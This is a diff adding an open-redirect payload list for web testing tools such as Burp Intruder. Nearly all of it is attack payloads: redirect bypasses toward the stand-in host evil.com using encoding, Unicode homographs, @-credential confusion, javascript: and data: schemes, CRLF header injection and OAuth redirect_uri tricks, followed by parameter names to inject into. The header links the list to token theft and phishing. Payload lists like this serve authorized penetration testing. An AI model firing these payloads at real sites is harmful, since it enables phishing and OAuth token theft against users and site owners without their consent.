@@ -1,1 +1,172 @@
+# ============================================================
+# Open Redirect Payloads
+# Use: Burp Intruder, dalfox, manual testing
+# Inject into: redirect=, next=, return=, url=, to=, goto=
+# Chain with: OAuth token theft, phishing, SSRF bypass
+# ============================================================
 
+# ---- Basic ----
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+////evil.com
+/\evil.com
+\/evil.com
+\\/evil.com
+
+# ---- Protocol-Relative ----
+//evil.com
+//evil.com/path
+//evil.com/path?q=1
+//evil.com%2f
+//evil.com%2fpath
+//evil.com#
+//evil.com%23
+
+# ---- @-Based (URL credential confusion) ----
+https://target.com@evil.com
+https://target.com:443@evil.com
+http://target.com@evil.com/path
+//target.com@evil.com
+@evil.com
+//0xd83dude@evil.com
+
+# ---- Subdomain Confusion ----
+https://evil.com?target.com
+https://evil.com#target.com
+https://target.com.evil.com
+https://evil.com/target.com
+https://evil.com\@target.com
+
+# ---- URL Encoding Bypass ----
+%2F%2Fevil.com
+%2F%2Fevil.com%2F
+/%09/evil.com
+/%2F/evil.com
+//evil%2ecom
+//evil%252ecom
+//evil%00.com
+//evil.com%00
+//evil.com%0d
+//evil.com%0a
+//evil.com%09
+%0a//evil.com
+%0d//evil.com
+%09//evil.com
+%00//evil.com
+
+# ---- Unicode/IDS Bypass ----
+//eeevil.com (homograph)
+//еvil.com (Cyrillic е)
+//𝓮vil.com
+//evil。com (fullwidth period)
+//evil．com (fullwidth dot)
+//evil%E3%80%82com
+
+# ---- Path-Based ----
+/evil.com
+/../evil.com
+/../../evil.com
+/..%2F..%2Fevil.com
+/..//evil.com
+/./evil.com
+
+# ---- JavaScript Scheme ----
+javascript:alert(1)
+javascript:window.location='https://evil.com'
+javascript:window.open('https://evil.com')
+data:text/html,<script>window.location='https://evil.com'</script>
+vbscript:window.location='https://evil.com'
+
+# ---- Double URL Encoding ----
+%252F%252Fevil.com
+%25252F%25252Fevil.com
+//evil.%63om
+//evil.c%6fm
+
+# ---- Newline Injection (header injection chain) ----
+https://evil.com%0d%0aLocation:%20https://evil.com
+https://evil.com%0aLocation:%20https://evil.com
+https://evil.com\r\nLocation:\x20https://evil.com
+
+# ---- Whitelisted Domain Bypass ----
+# If filter checks if URL contains target.com:
+https://evil.com?ref=target.com
+https://evil.com#target.com
+https://evil.com/target.com
+https://target.com.evil.com
+https://targetXcom.evil.com
+
+# ---- Specific Framework Bypass ----
+# Spring: redirect:https://evil.com
+# Rails: /redirects?uri=//evil.com
+# Django next param
+/?next=//evil.com
+/?next=https://evil.com
+/?next=%2F%2Fevil.com
+
+# ---- OAuth Redirect URI Bypass ----
+# If redirect_uri must match pattern:
+https://target.com/callback/../../../evil.com
+https://target.com.evil.com/callback
+https://target.com%60.evil.com/callback
+https://evil.com%23.target.com/callback
+https://evil.com?redirect_uri=https://target.com/callback
+
+# ---- CRLF + Open Redirect Chain ----
+/%0d%0aLocation:%20https://evil.com
+/%0aLocation:%20https://evil.com
+/redirect?url=%0d%0aLocation:%20https://evil.com
+
+# ---- Common Parameter Names (inject above payloads) ----
+redirect
+redirect_uri
+redirect_url
+redirectUri
+redirectUrl
+return
+returnUrl
+return_url
+returnTo
+return_to
+next
+nextUrl
+next_url
+continue
+continueUrl
+continue_url
+url
+URL
+uri
+URI
+goto
+go
+target
+to
+dest
+destination
+forward
+forwardTo
+out
+exit
+jump
+link
+href
+action
+success
+successUrl
+success_url
+failure
+failureUrl
+failure_url
+cancel
+cancelUrl
+cancel_url
+callback
+callbackUrl
+callback_url
+ref
+referer
+referrer
+location
